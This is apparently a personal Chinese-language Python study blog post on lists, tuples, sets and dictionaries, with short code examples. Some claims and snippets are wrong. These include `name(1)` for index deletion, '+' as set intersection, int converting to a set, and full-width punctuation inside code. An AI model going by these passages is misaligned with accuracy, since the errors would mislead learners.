<h4 id="4-2-1追加，在原列表中尾部追加值"><a href="#4-2-1追加，在原列表中尾部追加值" class="headerlink" title="4.2.1追加，在原列表中尾部追加值"></a>4.2.1追加，在原列表中尾部追加值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_list = []</span><br><span class="line">user_list.append(<span class="string">&quot;动感&quot;</span>)</span><br><span class="line">user_list.append(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(user_list)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#[&#x27;动感&#x27;, &#x27;joker&#x27;]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例</span></span><br><span class="line">user_list = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    user = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名（q或Q退出）&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.upper() == <span class="string">&quot;Q&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    user_list.append(user)</span><br><span class="line">    <span class="built_in">print</span>(user_list)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例2</span></span><br><span class="line">user_list = []</span><br><span class="line">hello = <span class="string">&quot;欢迎来到越江的第一个游戏&quot;</span></span><br><span class="line"><span class="built_in">print</span>(hello.center(<span class="number">30</span>, <span class="string">&quot;*&quot;</span>))</span><br><span class="line">h = <span class="number">1</span></span><br><span class="line">f = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> f:</span><br><span class="line">    user_number = <span class="built_in">input</span>(<span class="string">&quot;请输入要参加游戏的玩家数量: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> user_number.isdecimal():</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;请输入一个数字！fuck u !&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">number = <span class="built_in">int</span>(user_number)</span><br><span class="line"><span class="keyword">while</span> h&lt;= number:</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">f&quot;请输入玩家姓名(<span class="subst">&#123;h&#125;</span>/<span class="subst">&#123;number&#125;</span>)&quot;</span>)</span><br><span class="line">    user_list.append(username)</span><br><span class="line">    h = h +<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(user_list)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-2-2批量追加"><a href="#4-2-2批量追加" class="headerlink" title="4.2.2批量追加"></a>4.2.2批量追加</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = []</span><br><span class="line">name.extend([<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>])</span><br></pre></td></tr></table></figure>

<h4 id="4-2-3插入，在原列表的指定位置插入值"><a href="#4-2-3插入，在原列表的指定位置插入值" class="headerlink" title="4.2.3插入，在原列表的指定位置插入值"></a>4.2.3插入，在原列表的指定位置插入值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;xiaochou&quot;</span>]</span><br><span class="line">name.insert(<span class="number">1</span>,<span class="string">&quot;动感&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-2-4在原列表中根据值删除（从左到右找到第一个删除）【如果里面找不到那个值就会报错】"><a href="#4-2-4在原列表中根据值删除（从左到右找到第一个删除）【如果里面找不到那个值就会报错】" class="headerlink" title="4.2.4在原列表中根据值删除（从左到右找到第一个删除）【如果里面找不到那个值就会报错】"></a>4.2.4在原列表中根据值删除（从左到右找到第一个删除）【如果里面找不到那个值就会报错】</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;dhk&quot;</span>]</span><br><span class="line">name.remove(<span class="string">&quot;dhk&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-2-5在原列表中根据索引删除某个元素"><a href="#4-2-5在原列表中根据索引删除某个元素" class="headerlink" title="4.2.5在原列表中根据索引删除某个元素"></a>4.2.5在原列表中根据索引删除某个元素</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&quot;小丑&quot;</span>,<span class="string">&quot;动感&quot;</span>,<span class="string">&quot;joker&quot;</span>]</span><br><span class="line">name.pop()<span class="comment">#删除最后一个</span></span><br><span class="line">name(<span class="number">1</span>)<span class="comment">#删除动感</span></span><br></pre></td></tr></table></figure>

<p>注：用了pop之后数据类型变为str</p>
<h4 id="4-2-6清空原列表"><a href="#4-2-6清空原列表" class="headerlink" title="4.2.6清空原列表"></a>4.2.6清空原列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_list = [&quot;xiaohcou&quot;,&quot;dongan&quot;]</span><br><span class="line">user_list.clear()</span><br></pre></td></tr></table></figure>

<h4 id="4-2-7根据值获取索引（从左到右找到第一个删除）【慎用，找不到报错】"><a href="#4-2-7根据值获取索引（从左到右找到第一个删除）【慎用，找不到报错】" class="headerlink" title="4.2.7根据值获取索引（从左到右找到第一个删除）【慎用，找不到报错】"></a>4.2.7根据值获取索引（从左到右找到第一个删除）【慎用，找不到报错】</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_list = [<span class="string">&quot;xiaohcou&quot;</span>,<span class="string">&quot;dongan&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;dongan&quot;</span> <span class="keyword">in</span> user_list:</span><br><span class="line">    index = user_list.index(<span class="string">&quot;dongan&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(index)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不存在&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-2-8列表元素排序"><a href="#4-2-8列表元素排序" class="headerlink" title="4.2.8列表元素排序"></a>4.2.8列表元素排序</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数字排序</span></span><br><span class="line">num_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>]</span><br><span class="line">num_list.sort()<span class="comment">#从小到大排序</span></span><br><span class="line">num_list.sort(reverse=<span class="literal">True</span>)<span class="comment">#从大到小排序</span></span><br><span class="line"><span class="built_in">print</span>(num_list)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字符串排序</span></span><br><span class="line">name = [<span class="string">&quot;动感&quot;</span>，<span class="string">&quot;jocker&quot;</span>，<span class="string">&quot;dhk是一个小丑&quot;</span>]</span><br><span class="line"><span class="comment">#sort原理：转换成unicode然后再进行比较</span></span><br><span class="line">name.sort()</span><br></pre></td></tr></table></figure>

<p>注意：请数据类型统一的时候进行比较，不然会报错。</p>
<h4 id="4-2-9反转原列表"><a href="#4-2-9反转原列表" class="headerlink" title="4.2.9反转原列表"></a>4.2.9反转原列表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;jocker&quot;</span>]</span><br><span class="line">name.reverse()</span><br></pre></td></tr></table></figure>

<h3 id="4-3公共功能"><a href="#4-3公共功能" class="headerlink" title="4.3公共功能"></a>4.3公共功能</h3><h4 id="4-3-1相加"><a href="#4-3-1相加" class="headerlink" title="4.3.1相加"></a>4.3.1相加</h4><h4 id="4-3-2相乘"><a href="#4-3-2相乘" class="headerlink" title="4.3.2相乘"></a>4.3.2相乘</h4><p>列表*整型 将列表中的元素再创建n份拼接在列表后面并生成一个新的列表。</p>
<h4 id="4-3-3运算符in包含"><a href="#4-3-3运算符in包含" class="headerlink" title="4.3.3运算符in包含"></a>4.3.3运算符in包含</h4><p>用来判断元素是否在列表中，返回一个布尔值。</p>
<p>注意：in关键字判断元素是否在列表中是一个一个判断的，效率低下。</p>
<p>在后面会介绍高效率的方法。</p>
<h4 id="4-3-4获取长度"><a href="#4-3-4获取长度" class="headerlink" title="4.3.4获取长度"></a>4.3.4获取长度</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = [&quot;xiaochou&quot;,&quot;dhk&quot;,&quot;jocker&quot;]</span><br><span class="line">print(len(name))</span><br></pre></td></tr></table></figure>

<h4 id="4-3-5索引"><a href="#4-3-5索引" class="headerlink" title="4.3.5索引"></a>4.3.5索引</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;jocker&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>])</span><br><span class="line"><span class="comment">#扩展基于索引的删除</span></span><br><span class="line"><span class="keyword">del</span> name[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure>

<h4 id="4-3-6切片"><a href="#4-3-6切片" class="headerlink" title="4.3.6切片"></a>4.3.6切片</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;jocker&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>:<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<h4 id="4-3-7步长"><a href="#4-3-7步长" class="headerlink" title="4.3.7步长"></a>4.3.7步长</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = [<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;jocker&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>:<span class="number">2</span>：<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h4 id="4-3-8思维拓展（实现一个删除姓董的功能）"><a href="#4-3-8思维拓展（实现一个删除姓董的功能）" class="headerlink" title="4.3.8思维拓展（实现一个删除姓董的功能）"></a>4.3.8思维拓展（实现一个删除姓董的功能）</h4><p>首先补充一个函数range</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">range</span>(stop)</span><br><span class="line"><span class="built_in">range</span>(start, stop[, step])</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_list = [<span class="string">&quot;董小丑&quot;</span>,<span class="string">&quot;董动感&quot;</span>,<span class="string">&quot;joker&quot;</span>,<span class="string">&quot;董礼仪&quot;</span>,<span class="string">&quot;嘿嘿我不姓董&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user_list)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):<span class="comment">#这里记住是前取后不取</span></span><br><span class="line">    item = user_list[index]</span><br><span class="line">    <span class="keyword">if</span> item.startswith(<span class="string">&quot;董&quot;</span>):</span><br><span class="line">        user_list.remove(item)</span><br><span class="line"><span class="built_in">print</span>(user_list)</span><br><span class="line"><span class="comment">#这里是从后面开始删除用户的，这样做的好处就是不会打乱前面的用户在列表中的顺序。</span></span><br></pre></td></tr></table></figure>

<h3 id="4-4类型的转换"><a href="#4-4类型的转换" class="headerlink" title="4.4类型的转换"></a>4.4类型的转换</h3><p>很少会用到列表的数据转换。但是为了凑齐这个目录我还是把这个写上。</p>
<p>(๑╹◡╹)ﾉ”</p>
<h3 id="4-5嵌套"><a href="#4-5嵌套" class="headerlink" title="4.5嵌套"></a>4.5嵌套</h3><p>列表属于容器，内部可以存放各种数据，所以他也支持列表的嵌套。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="string">&quot;小丑&quot;</span>,[<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;joker&quot;</span>],<span class="literal">True</span>,[<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>],<span class="string">&quot;动感&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(data[<span class="number">0</span>])<span class="comment">#小丑</span></span><br><span class="line"><span class="built_in">print</span>(data[<span class="number">1</span>][<span class="number">1</span>])<span class="comment">#joker</span></span><br><span class="line"><span class="comment">#当然除了索引还有增加，删除都是可以这样操作的，感觉有点像二维数组又不是那么像。</span></span><br></pre></td></tr></table></figure>

<h2 id="5-元组"><a href="#5-元组" class="headerlink" title="5.元组"></a>5.元组</h2><p>元组是一个有序且不可变的容器，在里面可以存放多个不同类型的元素。</p>
<h3 id="5-1定义"><a href="#5-1定义" class="headerlink" title="5.1定义"></a>5.1定义</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1 = (11,22,33)</span><br></pre></td></tr></table></figure>

<p>建议：在元组最后加一个逗号，用于表示他是一个元组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d1 = (1)#python在处理的时候会把他当作整型1</span><br><span class="line">d2 = (1,)#元组</span><br></pre></td></tr></table></figure>

<h3 id="5-2独有功能"><a href="#5-2独有功能" class="headerlink" title="5.2独有功能"></a>5.2独有功能</h3><p>没有哦！</p>
<p>(*´▽｀)ノノ</p>
<h3 id="5-3公共功能"><a href="#5-3公共功能" class="headerlink" title="5.3公共功能"></a>5.3公共功能</h3><p>其实也和列表差球不多，相加 相乘 获取长度 索引 切片 步长 for循环</p>
<h3 id="5-4转换"><a href="#5-4转换" class="headerlink" title="5.4转换"></a>5.4转换</h3><p>其他类型转换为元组，使用tuple()，目前只有字符串和列表可以转换为元组。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;dhk&quot;</span></span><br><span class="line">data = <span class="built_in">tuple</span>(name)</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#(&#x27;d&#x27;, &#x27;h&#x27;, &#x27;k&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-5嵌套"><a href="#5-5嵌套" class="headerlink" title="5.5嵌套"></a>5.5嵌套</h3><p>由于元组和列表都可充当容器，他们内部可以放很多元素，也支持元素内的各种嵌套。</p>
<p>注意：元组中的列表可以修改内容但是不能对这个列表整个进行修改，因为这个列表属于元组的一个元素。</p>
<p>ex：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = ([<span class="number">1</span>,<span class="number">2</span>],(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),)</span><br></pre></td></tr></table></figure>

<h4 id="5-5-1应用扩展，实现用户登陆"><a href="#5-5-1应用扩展，实现用户登陆" class="headerlink" title="5.5.1应用扩展，实现用户登陆"></a>5.5.1应用扩展，实现用户登陆</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先是原来的数据里面就有两个用户</span></span><br><span class="line">user_list = [(<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;joker&quot;</span>),(<span class="string">&quot;hi&quot;</span>,<span class="string">&quot;nihao&quot;</span>)]</span><br><span class="line"><span class="comment">#先让用户创建一个账户</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&quot;请输入你的账户：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a.isdecimal():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入纯数字账户！&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:i += <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">2</span>:</span><br><span class="line">    b = <span class="built_in">input</span>(<span class="string">&quot;请输入您要的密码： &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b.isdecimal():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入纯数字密码！&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">item = (<span class="string">f&quot;<span class="subst">&#123;a&#125;</span>&quot;</span>,<span class="string">f&quot;<span class="subst">&#123;b&#125;</span>&quot;</span>)<span class="comment">#这里还是用列表比较好，因为方便修改密码，但是因为学到元组了就用这个。</span></span><br><span class="line">user_list.append(item)</span><br><span class="line"><span class="comment">#然后这里假设这个用户要登陆了，来调取账户进行比对。</span></span><br><span class="line">a = <span class="literal">True</span></span><br><span class="line">b = <span class="literal">True</span></span><br><span class="line">username = user_list[<span class="number">2</span>][<span class="number">0</span>]</span><br><span class="line">userpwd = user_list[<span class="number">2</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> b:</span><br><span class="line">    name = <span class="built_in">input</span>(<span class="string">&quot;请输入您的账户: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> name == username:</span><br><span class="line">        b= <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&quot;请输入正确的账户&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> a:</span><br><span class="line">    paswod = <span class="built_in">input</span>(<span class="string">&quot;请输入您的密码: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> paswod == userpwd:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line">        a= <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码错误&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="6-集合（set）"><a href="#6-集合（set）" class="headerlink" title="6.集合（set）"></a>6.集合（set）</h2><p>集合是一个无序，可变，不允许数据重复容器。</p>
<h3 id="6-1定义"><a href="#6-1定义" class="headerlink" title="6.1定义"></a>6.1定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = &#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="string">&quot;dhk&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>1.因为是无序（虽然这里看着有顺序但是在系统处理中是没有顺序的）的，所以无法通过索引取值。</p>
<p>2.但是可以添加和删除数据。</p>
<p>3.也不允许数据重复</p>
<p>4.一般在维护一大堆不重复的数据时，就可以用它。比如说：做爬虫去网上找图片链接，为了避免链接重复，就可以用集合来存储图片的地址</p>
<p>5.定义空集合的时候只能使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v = <span class="built_in">set</span>()<span class="comment">#定义集合</span></span><br><span class="line">v = &#123;&#125;<span class="comment">#定义的是空字典</span></span><br></pre></td></tr></table></figure>

<h3 id="6-2独有功能"><a href="#6-2独有功能" class="headerlink" title="6.2独有功能"></a>6.2独有功能</h3><h4 id="6-2-1添加元素"><a href="#6-2-1添加元素" class="headerlink" title="6.2.1添加元素"></a>6.2.1添加元素</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;joker&quot;</span>&#125;</span><br><span class="line">data.add(<span class="string">&quot;动感&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="6-2-2删除元素"><a href="#6-2-2删除元素" class="headerlink" title="6.2.2删除元素"></a>6.2.2删除元素</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;joker&quot;</span>&#125;</span><br><span class="line">data.discard(<span class="string">&quot;dhk&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="6-2-3交集"><a href="#6-2-3交集" class="headerlink" title="6.2.3交集"></a>6.2.3交集</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = &#123;<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;joker&quot;</span>&#125;</span><br><span class="line">s2 = &#123;<span class="string">&quot;动感&quot;</span>,<span class="string">&quot;dhk&quot;</span>&#125;</span><br><span class="line">s3 = s1 &amp; s2 <span class="comment">#方式一</span></span><br><span class="line">s4 = s1.intersection(s2)<span class="comment">#方式2</span></span><br></pre></td></tr></table></figure>

<h4 id="6-2-4并集"><a href="#6-2-4并集" class="headerlink" title="6.2.4并集"></a>6.2.4并集</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = &#123;<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;joker&quot;</span>&#125;</span><br><span class="line">s2 = &#123;<span class="string">&quot;动感&quot;</span>,<span class="string">&quot;dhk&quot;</span>&#125;</span><br><span class="line">s3 = s1 | s2<span class="comment">#方式1</span></span><br><span class="line">s4 = s1.union(s2)<span class="comment">#方式2</span></span><br></pre></td></tr></table></figure>

<h4 id="6-2-5差集"><a href="#6-2-5差集" class="headerlink" title="6.2.5差集"></a>6.2.5差集</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = &#123;<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;joker&quot;</span>&#125;</span><br><span class="line">s2 = &#123;<span class="string">&quot;动感&quot;</span>,<span class="string">&quot;dhk&quot;</span>&#125;</span><br><span class="line">s3 = s1 - s2<span class="comment">#方式1 s1中有且s2没有的值</span></span><br><span class="line">s4 = s1.difference(s2)<span class="comment">#方式2 s1中有且s2没有的值</span></span><br></pre></td></tr></table></figure>

<h3 id="6-3公共功能"><a href="#6-3公共功能" class="headerlink" title="6.3公共功能"></a>6.3公共功能</h3><h4 id="6-3-1减，就是计算差集"><a href="#6-3-1减，就是计算差集" class="headerlink" title="6.3.1减，就是计算差集"></a>6.3.1减，就是计算差集</h4><h4 id="6-3-2加，就是计算交集"><a href="#6-3-2加，就是计算交集" class="headerlink" title="6.3.2加，就是计算交集"></a>6.3.2加，就是计算交集</h4><h4 id="6-3-3-，计算并集"><a href="#6-3-3-，计算并集" class="headerlink" title="6.3.3|，计算并集"></a>6.3.3|，计算并集</h4><h4 id="6-3-4长度"><a href="#6-3-4长度" class="headerlink" title="6.3.4长度"></a>6.3.4长度</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = &#123;<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;joker&quot;</span>&#125;</span><br><span class="line">data = <span class="built_in">len</span>(s1)</span><br></pre></td></tr></table></figure>

<h4 id="6-3-5for循环"><a href="#6-3-5for循环" class="headerlink" title="6.3.5for循环"></a>6.3.5for循环</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = &#123;<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;joker&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s1:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>

<h3 id="6-4转换"><a href="#6-4转换" class="headerlink" title="6.4转换"></a>6.4转换</h3><p>使用set()进行转换，如果数据有重复的话会自动剔除。</p>
<p>注：int\list\tuple\dict都可以转化成集合</p>
<h3 id="6-5其他"><a href="#6-5其他" class="headerlink" title="6.5其他"></a>6.5其他</h3><h4 id="6-5-1集合的储存原理"><a href="#6-5-1集合的储存原理" class="headerlink" title="6.5.1集合的储存原理"></a>6.5.1集合的储存原理</h4><p><img src="/2021/12/29/%E5%9B%9B%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/image-20211229211248169.png" alt="image-20211229211248169"></p>
<h4 id="6-5-2元素必须可哈希-所以会存在hash碰撞后面会说"><a href="#6-5-2元素必须可哈希-所以会存在hash碰撞后面会说" class="headerlink" title="6.5.2元素必须可哈希(所以会存在hash碰撞后面会说)"></a>6.5.2元素必须可哈希(所以会存在hash碰撞后面会说)</h4><p>根据储存原理，集合的元素必须是可哈希的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">hash</span>(<span class="string">&quot;动感&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#6995344959373892725</span></span><br></pre></td></tr></table></figure>

<p>目前可哈希的数据类型：int\bool\str\tuple,而list、set是不可哈希的</p>
<p>总结：集合的元素只能是：整型，布尔，字符串，元组</p>
<p><a href="https://blog.csdn.net/qq_40803710/article/details/80945617">(27条消息) 哈希表冲突及处理冲突的方法_Hello_GY 的博客-CSDN博客_哈希表冲突</a></p>
<h4 id="6-5-3查找的速度特别快"><a href="#6-5-3查找的速度特别快" class="headerlink" title="6.5.3查找的速度特别快"></a>6.5.3查找的速度特别快</h4><p>因为储存原理的特殊，集合的查找效率特别快</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_name = &#123;<span class="string">&quot;xiaochou&quot;</span>,<span class="string">&quot;动感&quot;</span>,<span class="string">&quot;dhk&quot;</span>&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;dhk&quot;</span> <span class="keyword">in</span> user_name:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;在&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不在&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="6-5-4对比和嵌套"><a href="#6-5-4对比和嵌套" class="headerlink" title="6.5.4对比和嵌套"></a>6.5.4对比和嵌套</h4><p><img src="/2021/12/29/%E5%9B%9B%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/image-20211229212513337.png" alt="image-20211229212513337"></p>
<p>在嵌套的时候注意，由于true和false本质上是1和0，所以在集合里面不能同时出现true和1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = &#123;<span class="literal">True</span>,<span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(v1)<span class="comment">#&#123;True&#125;</span></span><br><span class="line"></span><br><span class="line">v1 = &#123;<span class="number">1</span>,<span class="literal">True</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(v1)<span class="comment">#&#123;1&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="7-字典（dict）"><a href="#7-字典（dict）" class="headerlink" title="7.字典（dict）"></a>7.字典（dict）</h2><p>字典是无序（py3.6之后就是有序的），键不重复且元素只能是键值对的可变的容器</p>
<p>键不重复，重复就会被覆盖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;k1&quot;</span>:<span class="number">1</span>,<span class="string">&quot;k1&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#&#123;&#x27;k1&#x27;: 2&#125;后面覆盖前面的</span></span><br></pre></td></tr></table></figure>

<h3 id="7-1定义-键必须是可哈希的"><a href="#7-1定义-键必须是可哈希的" class="headerlink" title="7.1定义(键必须是可哈希的)"></a>7.1定义(键必须是可哈希的)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = &#123;&#125;</span><br><span class="line">v2 = <span class="built_in">dict</span>()<span class="comment">#都是定义空字典</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例</span></span><br><span class="line">data = &#123;<span class="string">&quot;age&quot;</span>:<span class="number">99</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>:<span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;马戏团&quot;</span>,<span class="string">&quot;小丑&quot;</span>],</span><br><span class="line">        &#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>

<p>注意：在嵌套的时候注意，由于键必须是可哈希的，所以键的嵌套中不能使用字典。</p>
<h4 id="7-1-1一般什么时候使用字典"><a href="#7-1-1一般什么时候使用字典" class="headerlink" title="7.1.1一般什么时候使用字典"></a>7.1.1一般什么时候使用字典</h4><p>当我们像表示一组固定信息的时候，用字典可以更加的直观。</p>
<h3 id="7-2独有功能"><a href="#7-2独有功能" class="headerlink" title="7.2独有功能"></a>7.2独有功能</h3><h4 id="7-2-1获取值"><a href="#7-2-1获取值" class="headerlink" title="7.2.1获取值"></a>7.2.1获取值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">info = &#123;<span class="string">&quot;age&quot;</span>:<span class="number">99</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>:<span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hobby&quot;</span>:[<span class="string">&quot;马戏团&quot;</span>,<span class="string">&quot;小丑&quot;</span>],</span><br><span class="line">       &#125;</span><br><span class="line">data = info.get(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#99</span></span><br><span class="line">data1 = info.get(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> data1 == <span class="literal">None</span>:<span class="comment">#键不存在，默认返回None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;键不存在&quot;</span>)</span><br></pre></td></tr></table></figure>

